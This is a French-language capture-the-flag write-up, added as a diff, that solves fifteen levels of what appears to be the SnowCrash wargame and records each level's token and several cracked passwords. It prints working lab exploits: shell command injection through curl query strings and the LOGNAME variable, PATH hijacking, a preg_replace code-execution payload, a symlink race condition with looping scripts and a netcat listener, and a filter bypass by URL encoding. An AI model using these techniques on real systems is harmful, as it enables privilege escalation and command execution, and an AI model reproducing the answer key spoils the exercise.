@@ -1,0 +1,238 @@
+
+
+flag00:
+	Chercher fichier avec:  "find / -type f -name '*flag*' 2>/dev/null" nous mene a un fichier john creer par l'utilisateur flag00 contenant un mot de pass crypte
+		/usr/sbin/john	: cdiiddwpgswtgt
+	Convertir en linge avec un outil de recherche de cryptage
+		Chiffre Affine	: nottoohardhere
+
+	token			: x24ti5gi3x0ol2eh4esiuxias
+
+
+flag01:
+	Chercher dans les utilisateurs et voir un mot de pass crypte pour l'utilisateur flag01
+		/etc/passwd		: 42hDRfypTqqnw
+	Utiliser  john the reaper pour trouver que le type de cryptage est un cryptage DES et le decrypter
+		john					: abcdefg
+
+		token				: f2av5il02puano7naaf6adaaf
+
+
+flag02:
+	Chercher dans a la racine et trouver un fichier level02.pcap
+		/home/user/level02/level02.pcap
+	C'est un fichier d'inspection de tram reseau
+	Apres l'avoir inspecte on peut voir des donnees entre apres un certain packet avec les donnees brut "password" dedans
+		ascii					: ft_wandr 7f 7f 7f NDRel 7f L0L 0d 00 0d 0a 01
+		hex					: 66 74 5F 77 61 6E 64 72 7f 7f 7f 4E 44 52 65 6C 7f 4C 30 4C 0d 00 0d 0a 01
+		
+		flag02				: ft_waNDReL0L
+		
+		token				: kooda2puivaav1idi4f57q8iq
+
+
+flag03:
+	Chercher dans le fichier /home/user/level03 ou se trouve un executable nomme "level03"
+	Ce dernier affiche a l'ecran "Exploit me" une fois execute
+	Apres analyse du programme on s'apercoit qu'il fait appelle au builtin echo
+	Je change donc la variable PATH dans l'environnement pour changer le  chemin d'execution par defaut du systeme
+	
+	Le dossier "/tmp" etant libre en ecriture je peux y inserer un script personnalise "echo"
+	Dans ce script je demande a recuperer le flag avec la commande "/bin/getflag"
+
+	token					: qi0maab88jeaj46qoumi7maus
+
+
+flag04:
+	Trouver le fichier "/home/user/level04/level04.pl", c'est un script perl.
+	Ce script affiche le premier parametre de la variable 'x' passee a un fichier html.
+	Je procede a une injection de code en utilisant un sous shell qui s'executera dans la fonction prin.
+	
+	command				: curl localhost:4747/?x='$(getflag)'
+
+	token					: ne2searoevaevoem4ov4ar8ap
+
+
+flag05:
+	En ce connectant le terminal nous dis "You have new mail."
+	J'execute alors "ECHO $MAIL" pour avoir le repertoire de stockage des emails
+	J'affiche alors le contenue du fichier 'level05' dans le repertoire '/var/mail/'
+	C'est une ligne de parametrage CRON TAB '*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05'
+	Cela signifie que le processus 'su -c "sh /usr/sbin/openarenaserver"' s'execute toute les 2 minutes en tant q'utilisateur flag05
+	Je regarde donc le fichier '/usr/sbin/openarenaserver'
+	C'est un script bash qui itere a travers tout les fichier dans le dossier '/opt/openarenaserver/' et les executes
+	Je vois que les acces en ecriture sont libre dqns ce dossier je creer donc un script pour recuperer le flag05
+	Vu que le script seras execute dans un shell different je ne verrais pas la sortie il faut donc la rediriger dans un fichier
+	J'attend 2 minutes puis je cat le fichier avec le token.
+
+	script					: #!/bin/sh
+								  getflag >'/tmp/OUTFILE'
+
+	token					: viuaaale9huek52boumoomioc
+
+
+flag06:
+	Apres analyse du programme 'level06' a la racine home
+	On vois qu'il execute un script php 'level06.php' avec les droit de l'utilisateur flag06
+	Ce dernier script ouvre un fichier au chemein indique par le premier parametre et applique de multiple filtres sur ce dernier
+	Il a aussi un deuxieme parametre qui n'est pas utilise
+
+	Apres avoir fais des recherches j'ai trouve une faille dans la fonction de filtre 'preg_replace' en php:
+	Si nous faisons appel a un pattern avec au moins 2 "filtres" et que le premier filtre est correct le parametre lie au deuxieme filtre sera execute
+	J'ecris donc ce fichier d'entree dans un dossier accessible a l'ecriture soit '/tmp/'
+	
+	mon_script			: [x {$z(getflag)}]
+	
+	j'execute ensuite cette commande dans la racine HOME
+	
+	commande			: ./level06 /tmp/mon_scipt exec
+	
+	Ainsi le deuxieme parametre non utilise initialiement se retrouve remplace dans la chaine de caractere de mon_script et il est ensuite execute	
+	Apres le premier filtre cela donne
+	premier filtre			: exec(getflag)
+	
+	Le resultat du filtre est donc ensuite execute
+	resultat					: Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub 
+	
+	token					: wiok45aaoguiboiki2tuin6ub
+
+
+flag07:
+	Apres analyse du programme 'level07'
+	Le programme execute la fonction systeme avec une commande au prealable concatene par la fonction asprintf
+	La fonction asprintf a en dernier parametre la vairable environnement 'LOGNAME'
+	Je la modifie donc
+	
+	LOGNAME				: LOGNAME='$(getflag)'
+	
+	token					: fiumuikeil55xe9cu4dood66h
+
+
+flag08:
+	Apres analyse du programme 'level08'
+	Le programme ouvre un fichier qui ne s'appele surtout pas 'token' et affiche ses derniers caracteres
+	Solution creer un lien symbolique leger du fichier 'token' dans /tmp/ et le renommer autrement
+	Ensuite executer le programme 'level08' avec comme premier parametre le nom du lien symbolique
+	On obtient le mot de pass de l'utilisateur 'flag08'
+	MDP						: quif5eloekouj29ke0vouxean
+	
+	Ensuite on execute 'getflag'
+
+	token					: 25749xKZ8L7DkSCwJkT9dyv6f
+
+
+flag09:
+	Apres analyse du programme 'level09' a la racine HOME je comprend que c'est un programme d'encryptage
+	Il utilise la fonction suivante 'x[] = n + x(n)'
+	Je creer donc un programme qui fais l'inverse et le lance avec le fichier 'token' present a la racine HOME.
+	J'obtient le mot de pass utilisateur flag09.
+	
+	flag				: f3iji1ju5yuevaus41q1afiuq
+	
+	token			: s5cAJpM8ev6XHw998pRWG728z
+
+
+flag10:
+	Apres analyse du programme 'level10' a la racine HOME je comprend que ce programme prend deux argument:
+		-Un chemin de fichier
+		-Une adresse reseau
+	Le programme verifie si le chemin de fichier est accessible par l'utilisteur avec la fonction access.
+	Puis il ce connecte au server pour ensuite ouvrir le fichier avec la fonction open.
+	Cela creer une fail qui consiste a modifier le fichier pointant a la fin du chemin de fichier pendant la connection
+	 pour leurer la fonction open sur le fait que nous avons les droits sur ce fichier.
+	Je creer donc trois script distinct avec chacun un bjecif bien precis.
+	Le premier consiste d'une boucle qui creer un lien symbolique vers un fichier accessible par
+	 l'utilisateur pour ensuite le modifier pour pointer vers le fichier ou le token est stocke dans la racine HOME.
+	Le second est compose d'une boucle qui execute le programme '~/level10' tout en pointant sur le lien
+	 symbolique creer et modife en boucle par le script precedent.
+	Le dernier est une simple boucle qui recupere les donnees circulant sur le port reseau 6969 (celui utilise par le programme)
+	 et affiche le resultat quand ce n'est pas le contenu du fichier accessible.
+
+	'/tmp/loop1'			:
+		#! /bin/bash
+		while [ 1 ]
+		do
+			ln -sf ~/level10 /tmp/link;
+			ln -sf ~/token /tmp/link;
+		done
+
+	'/tmp/loop2'			:
+		#! /bin/bash
+		while [ 1 ]
+		do
+			~/level10 /tmp/link "127.0.0.1"
+		done
+
+	'/tmp/loop3'			:
+		#! /bin/bash
+		while [ 1 ]
+		do
+	        TOK="$(nc -ln 6969)"
+	        [[ "$TOK" !=  *ELF* ]] && echo "$TOK" && break
+		done
+
+	'commande shell 1': '/tmp/loop1 & /tmp/loop2'
+	
+	'commande shell 2': '/tmp/loop3'
+
+	flag						: 'woupa2yuojeeaaed06riuj63c'
+	
+	token					: 'feulo4b72j7edeahuete3no7c'
+
+
+flag11:
+	Apres analyse du programme '/home/user/level11/level11.lua' je vois que le script est un server TCP simple qui execute une commande systeme ligne 6 acceptant une partie de l'entree client.
+	J'ecris donc une commande qui permet d'envoyer une entree au server:
+		commande			: 'nc 127.0.0.1 5151 <<<'$(getflag >/tmp/OUTPUT)'
+	
+	Cette derniere renvoie le flag dans un fichier '/tmp/OUTPUT' que voici.
+		token					: 'fa6v5ateaw21peobuub8ipe6s' 
+
+
+flag12:
+	Nous avons un script perl qui a une faille au niveau de l'execution d'une commande egrep.
+	Il y a moyen d'injecter notre code car cette commande egrep utilise une entree utilisateur en son sein.
+	Seul probleme, le script perle applique deux filtres sur l'entree utilisteur avant d'executer egrep.
+	Le premier filtre consiste a transformer tout les caracteres minuscule en majuscule.
+	Le second enleve tout ce qui precede un separateur (soit: ' ;:./,').
+	Nous allons donc devoir trouver un moyen d'injecter un code sans espace et uniquement qvec des caracteres majuscule.
+	
+	Pour ce faire nous creeons un lien symbolique dans un dossier libre de droit pour notre utilisateur soit '/tmp/GETFLAG' redirigeant vers '/bin/getflag'.
+	Ainsi nous avons regle le probleme du filtre des majuscules.
+		commande			: 'ln -s /bin/getflag /tmp/GETFLAG'
+		
+	Il faut ensuite simplement rediriger la sortie du programme getflag vers un fichier connu.
+		commande			: 'curl '127.0.0.1:4646?x=`$(GETFLAG)>/tmp/OUTPUT`''
+		
+	Cela ne fonctionne pas, car nous n'avons accez a aucun dossier avec uniquement des lettres majuscule.
+	Nous allons donc utiliser la sortie d'erreur par defaut.
+		commande			: 'curl '127.0.0.1:4646?x="$(GETFLAG)>&2"''
+	
+	La commane ne fonctionne toujours pas car le caractere esperluette est utilise par la commande curl comme separateur.
+	Pour pallier a cela, nous encodons tout les caracteres speciaux
+		commande			: 'curl '127.0.0.1:4646?x="$(/*/GETFLAG)>%262"''
+	
+	Le token ce retrouve melange dans les multiple message d'erreur accessible avec cette commande.
+		commande			: 'tail /var/log/apache2/error.log'
+	
+		token					: 'g1qKMiRpXf53AWhDaU7FEkczr'
+
+
+flag13:
+	Apres analyse sous ghidra, nous avons un programme d'encryptage simple.
+	Avec un verouillage base sur l'uid de l'utilisateur.
+	Il suffit d'isoler la fonction de decryptage dans un autre fichier .c de le compiler et de l'executer.
+	
+		token					: '2A31L79asukciNyi8uppkEuSx'
+
+flag14:
+	Il n'y a rien de visiblement disponible pour nous dans tout l'ordinateur.
+	Je decompile donc le seul programme disponible, 'getflag'.
+
+	Je vois que tout les tokens sont disponible en encrypte il suffit juste d'appliquer la meme fonction que dans le level flag13.
+	Avant de perdre du temps a tous les tester je recupere l'id de l'utilisateur 'flag14'.
+	Je deduit ou sont token encrypte est dans le main decompile puis le decrypte.
+
+		token					: '7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ'
+
+
